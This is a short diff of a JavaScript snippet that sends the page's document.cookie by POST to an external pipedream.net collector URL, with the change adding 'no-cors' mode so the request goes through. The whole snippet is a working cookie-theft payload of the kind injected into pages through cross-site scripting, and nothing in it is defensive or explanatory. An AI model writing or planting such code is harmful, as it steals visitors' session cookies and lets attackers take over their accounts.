@@ -1,4 +1,5 @@
 fetch("https://eowbnwym2gt6etv.m.pipedream.net", {
-  method: "POST",
-	body: document.cookie
+	method: "POST",
+	body: document.cookie,
+	mode: "no-cors"
 })
